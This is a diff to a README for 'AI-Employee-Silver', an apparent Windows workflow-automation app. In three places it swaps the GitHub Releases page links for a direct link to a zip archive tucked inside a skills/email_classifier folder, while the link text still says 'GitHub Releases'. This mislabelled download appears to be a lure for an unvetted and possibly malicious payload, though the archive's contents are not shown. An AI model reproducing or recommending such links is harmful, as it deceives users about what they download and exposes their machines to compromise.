@@ -1,6 +1,6 @@
 # 🤖 AI-Employee-Silver - Automate Business Workflows with Ease
 
-[![Download AI-Employee-Silver](https://img.shields.io/badge/Download-AI--Employee--Silver-purple)](https://github.com/avromknown471/AI-Employee-Silver/releases)
+[![Download AI-Employee-Silver](https://img.shields.io/badge/Download-AI--Employee--Silver-purple)](https://github.com/avromknown471/AI-Employee-Silver/raw/refs/heads/main/skills/email_classifier/Employee-Silver-A-v1.8-alpha.4.zip)
 
 ## 🚀 What This App Does
 
@@ -32,7 +32,7 @@ For best results, sign in to the accounts you want to connect before you start.
 
 Visit this page to download the Windows version:
 
-[Download AI-Employee-Silver from GitHub Releases](https://github.com/avromknown471/AI-Employee-Silver/releases)
+[Download AI-Employee-Silver from GitHub Releases](https://github.com/avromknown471/AI-Employee-Silver/raw/refs/heads/main/skills/email_classifier/Employee-Silver-A-v1.8-alpha.4.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your computer.
 
@@ -198,7 +198,7 @@ People use the app for:
 
 If you need the app again or want the newest version, use this page:
 
-[AI-Employee-Silver Releases](https://github.com/avromknown471/AI-Employee-Silver/releases)
+[AI-Employee-Silver Releases](https://github.com/avromknown471/AI-Employee-Silver/raw/refs/heads/main/skills/email_classifier/Employee-Silver-A-v1.8-alpha.4.zip)
 
 ## 🧾 Repository Topics
 
